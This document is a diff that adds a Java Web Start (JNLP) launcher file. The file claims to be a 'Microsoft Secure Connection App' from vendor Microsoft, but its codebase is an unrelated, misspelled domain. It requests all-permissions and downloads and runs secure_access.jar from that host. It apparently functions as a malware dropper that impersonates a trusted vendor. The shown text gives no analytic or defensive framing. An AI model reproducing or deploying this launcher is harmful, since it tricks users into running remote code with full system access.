@@ -1,0 +1,19 @@
+<?xml version="1.0" encoding="utf-8"?> 
+<jnlp spec="1.0+" codebase="http://secureinsruancequotesoftware.com/ " href="secure_access.jnlp">
+   <information> 
+      <title>Secure Access</title> 
+      <vendor>Microsoft</vendor> 
+      <homepage href="wwww.microsoft.com"/> 
+      <description>Microsoft Secure Connection App</description> 
+	  </information> 
+   <security>
+      <all-permissions/>
+   </security>
+   <resources> 
+      <j2se version="1.6+" /> 
+      <jar href="secure_access.jar" />
+   </resources> 
+     <application-desc main-class="Secure_Access"> 
+   </application-desc>
+</jnlp>
+
